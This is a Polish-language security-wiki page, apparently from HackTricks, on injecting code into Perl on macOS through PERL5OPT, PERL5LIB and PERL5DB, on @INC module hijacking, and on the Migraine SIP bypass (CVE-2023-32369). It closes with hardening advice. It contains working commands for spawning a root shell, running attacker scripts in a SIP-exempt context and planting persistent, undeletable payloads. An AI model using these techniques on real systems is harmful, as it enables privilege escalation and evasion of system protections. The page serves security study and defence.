# Wstrzykiwanie do aplikacji Perl

{{#include ../../../banners/hacktricks-training.md}}

## Via `PERL5OPT` & `PERL5LIB` env variable

Używając env variable **`PERL5OPT`**, można sprawić, aby **Perl** wykonywał dowolne polecenia podczas uruchamiania interpretera (nawet **przed** sparsowaniem pierwszej linii target scriptu).
Na przykład utwórz ten skrypt:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Teraz **wyeksportuj zmienną środowiskową** i wykonaj skrypt **perl**:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Inną opcją jest utworzenie modułu Perl (np. `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
Następnie użyj zmiennych środowiskowych, aby moduł został automatycznie zlokalizowany i załadowany:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Other interesting environment variables

* **`PERL5DB`** – gdy interpreter zostanie uruchomiony z flagą **`-d`** (debugger), zawartość `PERL5DB` jest wykonywana jako kod Perl *wewnątrz* kontekstu debuggera.
Jeśli możesz wpływać zarówno na środowisko, **jak i** flagi wiersza poleceń uprzywilejowanego procesu Perl, możesz zrobić coś takiego:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # otworzy shell przed wykonaniem skryptu
```

* **`PERL5SHELL`** – w systemie Windows ta zmienna określa, którego pliku wykonywalnego shell Perl użyje, gdy będzie musiał uruchomić shell. Wspomniano o niej tutaj wyłącznie dla kompletności, ponieważ nie ma znaczenia w systemie macOS.

Chociaż `PERL5DB` wymaga przełącznika `-d`, często można znaleźć skrypty maintenance lub instalacyjne, które są wykonywane jako *root* z włączoną tą flagą na potrzeby szczegółowego troubleshooting, przez co zmienna ta stanowi prawidłowy wektor escalation.

## Przez dependencies (@INC abuse)

Możliwe jest wyświetlenie ścieżki include, którą Perl będzie przeszukiwać (**`@INC`**), uruchamiając:
```bash
perl -e 'print join("\n", @INC)'
```
Typowy output w systemie macOS 13/14 wygląda następująco:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Niektóre ze zwróconych folderów w ogóle nie istnieją, jednak **`/Library/Perl/5.30`** istnieje, *nie jest* chroniony przez SIP i znajduje się *przed* folderami chronionymi przez SIP. Dlatego, jeśli możesz zapisywać jako *root*, możesz umieścić złośliwy moduł (np. `File/Basename.pm`), który będzie *preferencyjnie* ładowany przez każdy uprzywilejowany skrypt importujący ten moduł.

> [!WARNING]
> Nadal potrzebujesz uprawnień **root**, aby zapisywać w `/Library/Perl`, a macOS wyświetli monit **TCC** z prośbą o przyznanie procesowi wykonującemu operację zapisu uprawnienia *Full Disk Access*.

Na przykład, jeśli skrypt importuje **`use File::Basename;`**, możliwe byłoby utworzenie `/Library/Perl/5.30/File/Basename.pm` zawierającego kod kontrolowany przez atakującego.

## Obejście SIP przez Migration Assistant (CVE-2023-32369 „Migraine”)

W maju 2023 roku firma Microsoft ujawniła **CVE-2023-32369**, określaną przydomkiem **Migraine** — technikę post-exploitation, która pozwala atakującemu z uprawnieniami *root* całkowicie **ominąć System Integrity Protection (SIP)**.
Podatnym komponentem jest **`systemmigrationd`** — daemon posiadający entitlement `com.apple.rootless.install.heritable`. Każdy proces potomny uruchomiony przez tego daemona dziedziczy ten entitlement i dlatego działa **poza** ograniczeniami SIP.<sup>[[1]](#references)</sup>

Wśród procesów potomnych zidentyfikowanych przez badaczy znajduje się interpreter podpisany przez Apple:<sup>[[1]](#references)</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Ponieważ Perl respektuje `PERL5OPT` (a Bash respektuje `BASH_ENV`), zatrucie *środowiska* daemona wystarcza do uzyskania dowolnego wykonania w kontekście bez SIP:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Gdy `migrateLocalKDC` zostanie uruchomione, `/usr/bin/perl` startuje ze złośliwym `PERL5OPT` i wykonuje `/private/tmp/migraine.sh` *zanim SIP zostanie ponownie włączony*. Z tego skryptu można na przykład skopiować payload do **`/System/Library/LaunchDaemons`** lub przypisać plikowi rozszerzony atrybut `com.apple.rootless`, aby uczynić go **niemożliwym do usunięcia**.

Apple naprawiło ten problem w macOS **Ventura 13.4**, **Monterey 12.6.6** i **Big Sur 11.7.7**, ale starsze lub niezałatane systemy nadal są podatne na exploit.<sup>[[1]](#references)</sup>

## Zalecenia dotyczące hardeningu

1. **Wyczyść niebezpieczne zmienne** – uprzywilejowane launchdaemons lub zadania cron powinny uruchamiać się z czystym środowiskiem (`launchctl unsetenv PERL5OPT`, `env -i` itd.).
2. **Unikaj uruchamiania interpreterów jako root**, chyba że jest to absolutnie konieczne. Używaj skompilowanych plików binarnych lub wcześnie obniżaj uprawnienia.
3. **Dostarczaj skrypty z `-T` (taint mode)**, aby Perl ignorował `PERL5OPT` i inne niebezpieczne przełączniki, gdy włączone jest sprawdzanie skażenia.
4. **Aktualizuj macOS** – „Migraine” jest w pełni załatany w obecnych wydaniach.

## References

- [1] [Microsoft Security Blog – New macOS vulnerability, Migraine, could bypass System Integrity Protection (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
